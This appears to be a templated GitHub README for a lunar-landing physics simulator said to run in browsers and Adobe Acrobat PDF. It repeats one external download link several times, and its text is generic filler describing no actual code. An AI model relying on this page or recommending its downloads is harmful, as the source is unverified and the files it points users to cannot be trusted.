# Apollo Lunar Landing Simulator - Game Script Utility 2026

> **A browser and Adobe Acrobat PDF lunar-landing simulator** powered by a deterministic JavaScript physics engine for modeling free fall, lunar gravity, and landing results.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web%20browsers%20%7C%20Adobe%20Acrobat%20PDF-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonubhgreen2473/apollo-lunar-script-sim?style=flat-square)](https://github.com/jasonubhgreen2473/apollo-lunar-script-sim)

---

<p align="center">
  <a href="https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/">
    <img src="https://img.shields.io/badge/Download-Apollo%20Lunar%20Landing%20Simulator%20Script-brightgreen?style=for-the-badge" alt="Download Apollo Lunar Landing Simulator Script">
  </a>
</p>

> **[Download Apollo Lunar Landing Simulator](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/)**

---

[Download Latest Build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/)

---

## About the Simulator

Apollo Lunar Landing Simulator is an interactive landing experiment based on a deterministic JavaScript physics core. The simulation follows a craft through lunar free fall using constant gravity, then determines the outcome when the craft reaches the ground.

Two runtime formats are included: a browser-oriented technical interface and an Adobe Acrobat PDF version. Both rely on the same simulation architecture so that the physics behavior remains consistent. The browser environment also includes a test runner for checking the physics implementation directly in the page.

---

## Included Capabilities

- Reproducible physics calculations written in JavaScript
- Lunar motion modeled with constant gravity
- Free-fall movement simulation
- Ground-impact result processing
- Landed-versus-crashed outcome detection
- Technical interface for browser use
- Physics checks through an in-browser test runner
- Common simulation core shared by the web and Adobe Acrobat PDF versions

---

## Getting Started

1. Visit the [latest build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/).
2. Launch the browser simulator in a supported web browser.
3. To use the PDF edition, download the supplied document and open it in Adobe Acrobat.
4. Start a landing scenario through the interface and inspect the resulting outcome.

The web edition is used directly through its online interface. The PDF edition places the same general simulation architecture inside an Adobe Acrobat document.

---

## Simulation Model

Rather than exposing a separate set of user preference controls, the simulator's behavior is primarily determined by its physics implementation.

| Component | Description |
|---|---|
| Physics core | Deterministic JavaScript simulation logic |
| Gravity model | Constant lunar gravity |
| Motion model | Free-fall behavior |
| Impact handling | Ground-impact classification |
| Result states | Landed or crashed outcome detection |
| Test runner | In-browser physics verification |

---

## Supported Environments

- **Web browsers:** Run the simulator through its browser interface.
- **Adobe Acrobat PDF:** Run the PDF edition with Adobe Acrobat.
- **Shared implementation:** Both formats use the same simulation core.
- **Project format:** The web interface and PDF document are separate runtime forms of the simulator.

The model is specifically concerned with lunar landing behavior under constant gravity. Scenarios beyond the defined model, as well as unsupported document viewers, may not produce the intended behavior.

---

## Current Project Scope

The project currently centers on its deterministic physics core, browser interface, browser-based test runner, and shared operation across web browsers and Adobe Acrobat PDF.

---

## Frequently Asked Questions

### What is the quickest way to launch it?

Open the [latest build](https://jasonubhgreen2473.github.io/apollo-lunar-script-sim/) for the browser version, or load the supplied PDF document in Adobe Acrobat.

### Do I need to install the browser version?

No separate web installation is described. The browser edition is accessed through a supported web browser.

### Does the simulator support PDF?

Yes. A PDF edition is available for use in Adobe Acrobat in addition to the web version.

### Are the browser and PDF editions unrelated projects?

No. They are different runtime environments that use a shared simulation core.

### Is the physics model configurable?

The documented implementation uses deterministic JavaScript physics, constant lunar gravity, free fall, and impact classification. Changing those behaviors requires modifying the project implementation.

### What outcomes can the simulator report?

After evaluating the ground impact, the simulator identifies the result as either landed or crashed.

### Where should I keep the downloaded files?

Leave the browser build in its downloaded project location. Save the PDF edition wherever you normally store Acrobat documents, then open it with Adobe Acrobat.

### How do I verify the physics?

Run the in-browser physics test runner provided with the browser environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
